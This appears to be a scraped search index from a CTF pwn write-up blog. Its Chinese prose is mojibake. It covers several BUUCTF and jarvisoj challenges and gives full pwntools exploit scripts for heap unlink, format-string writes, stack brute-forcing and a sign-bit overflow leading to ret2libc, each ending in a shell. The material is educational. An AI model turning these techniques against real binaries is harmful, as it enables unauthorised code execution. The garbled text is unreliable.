import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./bamboobox\u0026#34; libc_name:str = \u0026#34;/home/giantbranch/share/share_files/security/buuctf_libc/libc-2.23_64.so\u0026#34; port: str = \u0026#34;27469\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x400E42 c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def show(index: int) -\u0026gt; bytes: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(f\u0026#34;{index} : \u0026#34;) return p.recv(6) def add(size: int, name: str): p.clean() p.sendline(b\u0026#34;2\u0026#34;) p.clean() p.sendline(str(size)) p.clean() p.sendline(name) def change(index: int, name: str): p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(name)+1)) p.clean() p.sendline(name) def remove(index: int): p.clean() p.sendline(b\u0026#34;4\u0026#34;) p.clean() p.sendline(str(index)) ptr = 0x6020c8 add(0x80, b\u0026#34;0\u0026#34;) add(0x80, b\u0026#34;1\u0026#34;) add(0x80, b\u0026#34;/bin/sh\\x00\\x00\u0026#34;) payload = (pg(0) + pg(0x80) + pg(ptr - 0x18) + pg(ptr - 0x10)).ljust(0x80, b\u0026#34;\\x00\u0026#34;) + pg(0x80) + pg(0x90) change(0, payload) remove(1) payload = b\u0026#34;\\x00\u0026#34;*0x10 + pg(0x80) + pg(m_elf.got[\u0026#39;atoi\u0026#39;]) change(0, payload) libcbase = u64(show(0).ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#39;atoi\u0026#39;] success(f\u0026#34;libcbase =\u0026gt; {hex(libcbase)}\u0026#34;) system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] change(0, pg(system_addr)) p.sendlineafter(b\u0026#34;Your choice:\u0026#34;, b\u0026#34;/bin/sh\\x00\u0026#34;) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/unlinkbuuctf-hitcontraining_unlink/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªä»£ç  å…¸å‹çš„å †èœå•é¢˜ ä»‹ç»ä¸€ä¸‹unlink unlinkå…¶å®å°±æ˜¯å¾ˆæ™®é€šï¼Œå¾ˆå¸¸è§„çš„ä¸€ç§ä»åŒå‘é“¾è¡¨ä¸­å–å‡ºèŠ‚ç‚¹çš„æœº","tags":["pwn","unlink","å †"],"title":"ã€unlinkã€‘BUUCTF hitcontraining_unlink"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp ASLRå¯¹æ ˆçš„å½±å“ æ„å»ºåœ°å€é“¾ çˆ†ç ´ å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec xman_2019_format [*] \u0026#39;/home/giantbranch/share_files/security/workspace/xman_2019_format/xman_2019_format\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ•´ä¸ªç¨‹åºåç¼–è¯‘å‡ºæ¥é€»è¾‘éå¸¸æ··ä¹±ï¼Œä½†é‡è¦çš„åªæœ‰ä¸‰ä¸ªå‡½æ•°ï¼š æœ‰ä¸€ä¸ªåé—¨å‡½æ•°\nã€HarekazeCTF2019ã€‘baby_rop.md babyheap_0ctf_2017.md ciscn_2019_en_2.md ciscn_2019_es_2.md ciscn_2019_ne_5.md ciscn_s_3.md get_started_3dsctf_2016.md jarvisoj_fm.md jarvisoj_level2_x64.md not_the_same_3dsctf_2016.md others_shellcode.md pwn2_sctf_2016.md xman_2019_format.md æš¨å—å¤§å­¦2022æ–°ç”Ÿèµ›åˆèµ› éå®˜æ–¹WriteUp.md\nè¿™ä¸ªå‡½æ•°è¯´æ˜äº†bufä¹Ÿå°±æ˜¯ä¿å­˜å­—ç¬¦ä¸²çš„åœ°å€åœ¨å †ä¸­\nè¿™ä¸ªå‡½æ•°è¯´æ˜ä¼šå°†bufä¸­çš„å­—ç¬¦ä¸²ä»¥|ä¸ºåˆ†å‰²ç¬¦åˆ†å‰²æˆå¤šä¸ªå­å­—ç¬¦ä¸²å¹¶æ‰“å°\nè¿™ä¸ªç¨‹åºå› ä¸ºåªæœ‰ä¸€æ¬¡è¾“å…¥çš„æœºä¼šï¼Œè€Œä¸”æ— æ³•æ›´æ”¹retå€¼ï¼Œæ‰€ä»¥è·å–shellæƒé™è¦ä¸€æ¬¡åˆ°ä½åœ°å®Œæˆï¼Œå› æ­¤è™½ç„¶å¯ä»¥æ³„éœ²æ ˆåœ°å€å´éš¾ä»¥åŠ ä»¥åˆ©ç”¨ã€‚\nå› æ­¤å¦‚æœæˆ‘ä»¬è¦æ›´æ”¹æ ˆåœ°å€ï¼Œå°±éœ€è¦ç”¨åˆ°çˆ†ç ´\næ„å»ºexp ASLRå¯¹æ ˆçš„å½±å“ é¦–å…ˆï¼Œæ¯æ¬¡åŠ è½½ç¨‹åºçš„æ—¶å€™ï¼Œæ ˆåŸºå€éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œä½†æ˜¯å12ä½ä¸º0\nå…¶æ¬¡ï¼Œå› ä¸ºé¡µå¯¹é½çš„å½±å“ï¼Œå› æ­¤æ ˆåœ°å€é™¤äº†æ ˆåŸºå€è¿˜è¦åŠ ä¸Šä¸€ä¸ªé¡µåœ°å€ï¼Œè¿™ä¸ªé¡µåœ°å€ä¸€å®šæ˜¯4KBçš„æ•´æ•°å€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªé¡µåœ°å€å¯¹æœ€å12ä½æ˜¯æ²¡æœ‰å½±å“çš„\nç„¶åï¼Œæ ˆåœ°å€è¿˜è¦åŠ ä¸Šä¸€ä¸ªåç§»ï¼Œè¿™ä¸ªåç§»ä¼šå¯¹æ ˆåœ°å€å12ä½é€ æˆå½±å“ï¼Œç»è¿‡è°ƒè¯•å‘ç°ï¼ŒåŒä¸€ä¸ªåœ°å€åœ¨æ¯æ¬¡è¿è¡Œçš„æ—¶å€™ï¼Œæœ€å4ä½ä¹Ÿå°±æ˜¯åœ°å€çš„æœ€åä¸€ä¸ª16è¿›åˆ¶æ•°æ˜¯ä¸å˜çš„\nä¸”çœ‹ä¸‹è¿°ç¨‹åºï¼š\n#include\u0026lt;stdio.h\u0026gt; int main(void){ int a = 1; printf(\u0026#34;%p\\n\u0026#34;, \u0026amp;a); return 0; } è¿è¡Œç»“æœï¼š\nå¯ä»¥çœ‹åˆ°ï¼Œå¯¹äº64ä½ç¨‹åºï¼Œæ ˆåœ°å€ä¹Ÿæ˜¯åªæœ‰æœ€åä¸€ä½ä¸å˜\næˆ‘ä»¬å†æ¥çœ‹ä¸‹32ä½ç¨‹åºçš„æƒ…å†µï¼š\nç»“è®ºå’Œ64ä½ç¨‹åºæ˜¯ä¸€æ ·çš„\nç¬”è€…ä¹Ÿä¸çŸ¥é“äº§ç”Ÿæ­¤ç°è±¡çš„æ ¹æœ¬åŸå› ï¼Œåªèƒ½å½“ä½œä¸€ä¸ªæ—¢å®šäº‹å®è®°äº†ã€‚å¦‚æœæœ‰å¸ˆå‚…çŸ¥é“æ­¤ç°è±¡çš„åŸå› ï¼Œå¸Œæœ›èƒ½åœ¨è¯„è®ºåŒºç•™ä¸‹æ‚¨çš„è§£é‡Šï¼Œæ„Ÿè°¢æ‚¨çš„ä»˜å‡ºï¼\nç¬”è€…çŒœæµ‹åŸå› ï¼šæ¯æ¬¡ç¨‹åºå¼€å§‹æ—¶ä¼šä¿è¯æ ˆåœ°å€æœ€åä¸€ä½ä¸º0ï¼Œè¿™æ ·ç»è¿‡æ—¢å®šæ•°é‡çš„popå’Œpushï¼Œåœ¨åŒä¸€ä¸ªç›¸å¯¹ä½ç½®çš„æ ˆåœ°å€çš„æœ€åä¸€ä½æ˜¯ä¸å˜çš„\næ„å»ºåœ°å€é“¾ å¦‚å›¾ï¼Œå¦‚æœæˆ‘ä»¬ç”¨%hhnå°†ebpä½ç½®æŒ‡å‘çš„åœ°å€æ”¹ä¸ºretåœ°å€ï¼Œé‚£ä¹ˆ0xffffd3b8ä¿å­˜çš„åœ°å€å°±æ˜¯retåœ°å€ï¼Œè¿™æ ·å­æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç¬¬ä¸‰ä¸ªçº¢æ¡†æ¡†è¿™æ¡é“¾æ¥æ›´æ”¹retåœ°å€äº†\nçˆ†ç ´ ä¸Šè¿°é€»è¾‘æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬éœ€è¦æ›´æ”¹æ ˆåœ°å€çš„æœ«ä¸€ä¸ªå­—èŠ‚ï¼Œè€Œè¿™ä¸ªå­—èŠ‚çš„é«˜å››ä½æ˜¯ä¸ç¡®å®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœæ›´æ”¹ï¼Œåˆ™åªæœ‰$\\frac{1}{16}$çš„å‡ ç‡æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åŠ ä¸€ä¸ªwhileå¾ªç¯å¤šè¯•å‡ æ¬¡å°±å¥½äº†\nå®Œæ•´exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher import sys pss: bool = False fn: str = \u0026#34;./xman_2019_format\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;28711\u0026#34; if_32: bool = False pg = p32 if if_32 else p64 context(arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal=[\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] if_debug: bool = False m_elf = ELF(fn) libc = ELF(libc_name) backdoor = 0x80485AB offset1 = 10 len1 = 0x6c offset2 = 18 len2 = 0x85AB format_string = f\u0026#39;%{len1}c%{offset1}$hhn|%{len2}c%{offset2}$hn\u0026#39; success(format_string) while(True): if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x400BA1\u0026#34;,) else: p = process(fn, env={\u0026#34;LD_PRELOAD\u0026#34;: libc_name}) p.clean() p.send(format_string) gdb.attach(p, \u0026#34;b* 0x804860B\u0026#34;) p.clean() try: p.interactive() except: info(\u0026#34;failed!\u0026#34;) p.close() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E7%88%86%E7%A0%B4%E6%A0%88%E6%9C%AB%E4%BD%8Dxman_2019_format/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp ASLRå¯¹æ ˆçš„å½±å“ æ„å»ºåœ°å€é“¾ çˆ†ç ´ å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec xman_2019_format [*] \u0026#39;/home/giantbranch/share_files/security/workspace/xman_2019_format/xman_2019_format\u0026#39; Arch: i386-32-little","tags":["pwn","çˆ†ç ´æ ˆæœ«ä½"],"title":"ã€çˆ†ç ´æ ˆæœ«ä½ã€‘xman_2019_format"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp ç¬¦å·ä½æº¢å‡º ret2libc å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file ./pwn2_sctf_2016 [*] \u0026#39;/home/peterl/security/workspace/pwn2_sctf_2016/pwn2_sctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æˆ‘ä»¬å‘ç°ç¬¬ä¸€æ¬¡è¾“å…¥çš„æ•°å­—å†³å®šäº†ç¬¬äºŒæ¬¡è¾“å…¥çš„å­—ç¬¦ä¸ªæ•°ï¼Œä½†æ˜¯å¿…é¡»å°äº32ï¼Œè€Œæˆ‘ä»¬æŸ¥çœ‹è¿‡æ ˆæƒ…å†µåå‘ç°32ä¸ªå­—ç¬¦æ˜¯ä¸å¤Ÿçš„\nç„¶åæˆ‘ä»¬å‘ç°get_nçš„ç¬¬äºŒä¸ªå‚æ•°çš„ç±»å‹ä¸ºunsigned intï¼š\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘ç¬¦å·ä½æ¼æ´\næ„å»ºexp ç¬¦å·ä½æº¢å‡º æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨è®¡ç®—æœºä¸­è´Ÿæ•°æ˜¯ç”±è¡¥ç æœºåˆ¶è¡¨ç¤ºçš„ ï¼ˆè¿˜æœ‰å¦ä¸€ç§ä¸æµè¡Œçš„è¡¨ç¤ºæ–¹æ³•ï¼Œå°±æ˜¯æŠŠç¬¬ä¸€ä½ä½œä¸ºç¬¦å·ä½ï¼Œ1è¡¨ç¤ºè´Ÿï¼Œ0è¡¨ç¤ºæ­£ï¼Œå‰©ä¸‹çš„ä½è¡¨ç¤ºæ•°å­—çš„ç»å¯¹å€¼ï¼Œä½†è¿™æ ·ä¼šäº§ç”Ÿ-0å’Œ+0ä¸¤ä¸ª0ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒåŸæœ¬å¦‚æœä¸è€ƒè™‘è´Ÿæ•°ï¼Œæˆ‘ä»¬å¯ä»¥è¡¨ç¤º0~0xffffffffçš„æ­£æ•°ï¼Œä½†æ˜¯ç°åœ¨æˆ‘ä»¬æŠŠå®ƒå¯¹åŠåˆ†ï¼Œç”¨åé¢é‚£ä¸€èŠ‚è¡¨ç¤ºè´Ÿæ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°è½´å°±å˜æˆäº†ï¼š\n0x80000000 ~ 0xffffffff 0 0x1 ~ 0x7fffffff $-2^{31}$ ~ $-1$ $0$ $1$ ~ $2^{31}-1$ ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨Cè¯­è¨€ä¸­è¿›è¡Œæ•°å­—çš„æ¯”è¾ƒæ—¶ï¼Œæˆ‘ä»¬æ˜¯æ¯”è¾ƒçš„å®ƒä»¬é€»è¾‘ä¸Šçš„å€¼ï¼Œä¹Ÿå°±æ˜¯-1 \u0026lt; 32ï¼Œå°½ç®¡-1åœ¨è®¡ç®—æœºå†…éƒ¨çš„æ•°å€¼æ˜¯å¤§äº32çš„ï¼ˆå› ä¸ºè´Ÿæ•°å®é™…çš„å€¼ä¸€å®šæ˜¯å¤§äºç­‰äº0x80000000çš„ï¼Œæ‰€ä»¥è´Ÿæ•°çš„ç¬¬ä¸€ä½ä¸€å®šæ˜¯1ï¼Œè€Œæ­£æ•°çš„ç¬¬ä¸€ä½ä¸€å®šæ˜¯0ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç¬¬ä¸€ä½æ¥åˆ¤æ–­æ•°å­—çš„æ­£è´Ÿäº†ï¼‰\nå¦‚æœæˆ‘ä»¬å°†-1å¼ºåˆ¶è½¬æ¢ä¸ºæ— ç¬¦å·æ•´æ•°ï¼Œé‚£ä¹ˆå®ƒè´Ÿæ•°çš„å±æ€§å°±æ¶ˆå¤±äº†ï¼Œå®ƒé€»è¾‘ä¸Šå°±æ˜¯$2^{32}-1$\nè¿™ç§é€»è¾‘ä¸Šçš„ä¸ä¸€è‡´å°±äº§ç”Ÿäº†ç¬¦å·ä½æ¼æ´\nret2libc è¿™é¢˜æœ€æ— è¯­çš„æ˜¯å®ƒæä¾›äº†ä¸€ä¸ªdo_thingå‡½æ•°ï¼š\næˆ‘è¿˜ä»¥ä¸ºæ˜¯è¦ç”¨syscallåšï¼Œæµªè´¹äº†å¥½å¤šæ—¶é—´æ‰¾èƒ½æ”¹å˜eaxã€ebxã€ecxã€edxçš„gadgetï¼Œç»“æœæ‰¾äº†ä¸€åœˆå°±æ˜¯æ²¡æœ‰èƒ½æ”¹eaxçš„ï¼Œåæ¥æ— å¥ˆåªèƒ½ç”¨ret2libcåš\nè¿™ä¸ªç¨‹åºæœ‰printfå‡½æ•°ï¼Œæˆ‘ä»¬é€šè¿‡printfå‡½æ•°æ³„éœ²åŸºå€å°±å¥½äº†\nå®Œæ•´exp éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é¢˜çš„libcåœ¨libcdatabaseæ˜¯æœä¸åˆ°çš„ï¼Œå› æ­¤ç”¨ä¸äº†libcsearcher\nå¯ä»¥å»BUUCTFçš„FQAä¸“æ æ‰¾libcçš„ä¸‹è½½åœ°å€\nfrom pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./pwn2_sctf_2016\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x80485B7\u0026#34;) else: p = process(fn) m_elf = ELF(fn) libc = ELF(libc_name) p.clean() p.sendline(b\u0026#34;-1\u0026#34;) p.clean() payload = b\u0026#34;a\u0026#34;*(0x2C + 0x4) + pg(m_elf.plt[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;vuln\u0026#39;]) + pg(m_elf.got[\u0026#39;printf\u0026#39;]) p.sendline(payload) p.recvuntil(b\u0026#39;\\n\u0026#39;) printf_addr = u32(p.recv(4)) success(hex(printf_addr)) base_addr = printf_addr - libc.sym[\u0026#39;printf\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] exit_addr: int = base_addr + libc.sym[\u0026#39;exit\u0026#39;] bin_sh_addr: int = base_addr + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) success(hex(base_addr)) p.clean() p.sendline(b\u0026#34;-1\u0026#34;) p.clean() ret: int = 0x08048346 payload = b\u0026#34;a\u0026#34;*(0x2C + 0x4) + \\ pg(system_addr) + pg(exit_addr) + pg(bin_sh_addr) p.sendline(payload) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E7%AC%A6%E5%8F%B7%E4%BD%8D%E6%BC%8F%E6%B4%9E+ret2libcpwn2_sctf_2016/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp ç¬¦å·ä½æº¢å‡º ret2libc å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file ./pwn2_sctf_2016 [*] \u0026#39;/home/peterl/security/workspace/pwn2_sctf_2016/pwn2_sctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX","tags":["pwn","ç¬¦å·ä½æ¼æ´","ret2libc"],"title":"ã€ç¬¦å·ä½æ¼æ´+ret2libcã€‘pwn2_sctf_2016"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp æ ¼å¼åŒ–å­—ç¬¦ä¸²è¦†ç›–ä»»æ„åœ°å€æ•°æ® å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec fm [*] \u0026#39;/home/peterl/security/workspace/fm/fm\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) æœ‰canaryï¼Œé‚£ä¼ ç»Ÿçš„æ ˆæº¢å‡ºè‚¯å®šä¸è¡Œäº†\nidaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æˆ‘ä»¬å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦è¿è¡Œsystem(\u0026quot;/bin/sh)å°±å¿…é¡»è®©xç­‰äº4ã€‚ä½†æ˜¯æˆ‘ä»¬ç‚¹è¿›xçœ‹ä¸€ä¸‹ï¼Œå‘ç°å®ƒæ˜¯ä¸€ä¸ªç­‰äº3çš„å…¨å±€å˜é‡ï¼ˆè¦æ˜¯ä¿å­˜åœ¨.rodataèŠ‚å°±å¯„äº†ï¼‰ï¼š\næˆ‘ä»¬çœ‹ä¸€ä¸‹ç¨‹åºä»£ç ï¼Œå‘ç°è¿™ä¹ˆä¸¤è¡Œï¼š\nread(0, buf, 0x50u); printf(buf); ç›´æ¥æ‰“å°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œç«‹é©¬æƒ³åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆæ‰€ä»¥ç»å¯¹ä¸èƒ½å¤ªè¿‡ç›¸ä¿¡ç”¨æˆ·çš„è¾“å…¥â€¦â€¦ï¼‰\næ„å»ºexp æ ¼å¼åŒ–å­—ç¬¦ä¸²è¦†ç›–ä»»æ„åœ°å€æ•°æ® è¿™ç§æ–¹æ³•åŸºäºï¼š\nformatå­—ç¬¦ä¸²ä¼šè¢«ä¿å­˜åœ¨æ ˆä¸­ %nå¯ä»¥ä½¿ç”¨ æˆ‘ä»¬é¦–å…ˆè¦æ‰¾åˆ°è¿™ä¸ªformatå­—ç¬¦ä¸²æ•°æ®å’Œespçš„åç§»ï¼Œæˆ‘ä»¬å…ˆè¾“å…¥ä¸€å¤§ä¸²aï¼Œç­‰åˆ°call printfçš„æ—¶å€™æŸ¥çœ‹æ ˆï¼š\næˆ‘ä»¬çœ‹åˆ°æ ˆé¡¶å‰ä¸¤ä¸ªæ•°æ®åˆ†åˆ«æ˜¯formatå­—ç¬¦ä¸²å’Œç¬¬1ä¸ªå‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¿å­˜åœ¨ç¬¬11ä¸ªå‚æ•°çš„ä½ç½®ï¼Œå› æ­¤åç§»å°±æ˜¯11\né‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ æˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²äº†ï¼š\næˆ‘ä»¬çš„ç›®çš„æ˜¯å‘æˆ‘ä»¬è¾“å…¥çš„åœ°å€å¤„å†™å…¥æ•°æ®4ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„åœ°å€æ˜¯ä¿å­˜åœ¨ç¬¬åä¸€ä¸ªå‚æ•°çš„ä½ç½®çš„ï¼Œè€Œä¸”åˆšåˆšå¥½32ä½çš„åœ°å€å ç”¨å››ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ï¼š\npayload = pg(0x804a02c) + b\u0026#34;%11$n\u0026#34; å¦‚æœæƒ³æŠŠåœ°å€æ”¾åœ¨åé¢ï¼Œå› ä¸º\u0026quot;%11$n\u0026quot;å ç”¨5ä¸ªå­—ç¬¦ï¼Œä¸ºäº†è¾“å…¥4æˆ‘ä»¬éœ€è¦åœ¨å…¶å‰é¢å¡«å……4ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ç°åœ¨ä¸€å…±å ç”¨9ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¡«å……3ä¸ªåƒåœ¾æ•°æ®è®©å®ƒå ç”¨è¾¾åˆ°12ä¸ªå­—ç¬¦ï¼Œè®©æˆ‘ä»¬çš„åœ°å€åœ¨ç¬¬14ä¸ªå‚æ•°çš„ä½ç½®ï¼š\npayload = b\u0026#34;aaaa%14$n!!!\u0026#34; + pg(0x804a02c) æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨pwntoolsæä¾›çš„è‡ªåŠ¨åŒ–å·¥å…·ï¼š\n# ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åç§»é‡ï¼Œä¹Ÿå°±æ˜¯11 # ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œkeyä¸ºéœ€è¦æ›´æ”¹çš„å˜é‡ï¼ˆå‡½æ•°ï¼‰åœ°å€ï¼Œvalä¸ºéœ€è¦æ›´æ”¹çš„å€¼ payload = fmtstr_payload(11, {0x804A02C: 0x4}) å®Œæ•´exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./fm\u0026#34; libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:libc_name}) p.clean() payload = fmtstr_payload(11, {0x804A02C: 0x4}) p.sendline(payload) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9Ejarvisoj_fm/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp æ ¼å¼åŒ–å­—ç¬¦ä¸²è¦†ç›–ä»»æ„åœ°å€æ•°æ® å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec fm [*] \u0026#39;/home/peterl/security/workspace/fm/fm\u0026#39; Arch: i386-32-little RELRO: Partial","tags":["pwn","æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"],"title":"ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‘jarvisoj_fmm"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file ciscn_s_3 [*] \u0026#39;/home/peterl/security/workspace/ciscn_s_3/ciscn_s_3\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  è¿™é‡Œæœ‰ä¸¤ä¸ªsyscallç”¨äºè¯»å†™ï¼Œå·²ç»å¾ˆæ˜æ˜¾åœ°æš—ç¤ºè¦ç”¨syscalläº†\næ¥ä¸‹æ¥å®ƒåˆæä¾›äº†ä¸€ä¸ªgadgetå‡½æ•°ï¼Œæ˜æ˜¾æ˜¯è¦ä¸ºsig_returnåšå¥½å‰ç½®å·¥ä½œï¼ˆè®¾ç½®RAXï¼‰\né‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±å¾ˆç®€å•äº†ï¼Œå…ˆè°ƒç”¨sig_returnï¼Œè¿™æ ·å®ƒå°±ä¼šæŠŠæ¥ä¸‹æ¥æˆ‘ä»¬å®‰æ’åœ¨æ ˆä¸Šçš„ä¸Šä¸‹æ–‡ä½œä¸ºæ¥ä¸‹æ¥è¦æ¢å¤çš„ä¸Šä¸‹æ–‡ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å®‰æ’ç³»ç»Ÿçš„å¯„å­˜å™¨äº†\næ„å»ºexp é¦–å…ˆç¬¬ä¸€æ¬¡è¿è¡Œçš„æ—¶å€™ä¼šæ‰“å°å‡ºæ¥rbpçš„åœ°å€ï¼Œä¸ºäº†è®©ç¨‹åºå†è¿è¡Œä¸€éï¼Œæˆ‘ä»¬å°†retåœ°å€è®¾ç½®ä¸ºvulå‡½æ•°çš„åœ°å€ï¼š\nstack_offset = -0x118 write_offset = 0x20 p.clean() p.send(b\u0026#34;a\u0026#34;*0x10 + pg(m_elf.sym[\u0026#39;vuln\u0026#39;])) p.recv(write_offset) bin_bash_addr = u64(p.recv(8)) + stack_offset é€šè¿‡è°ƒè¯•æ—¶çš„åç§»è®¡ç®—ï¼Œæˆ‘ä»¬å°±è·å¾—äº†æ 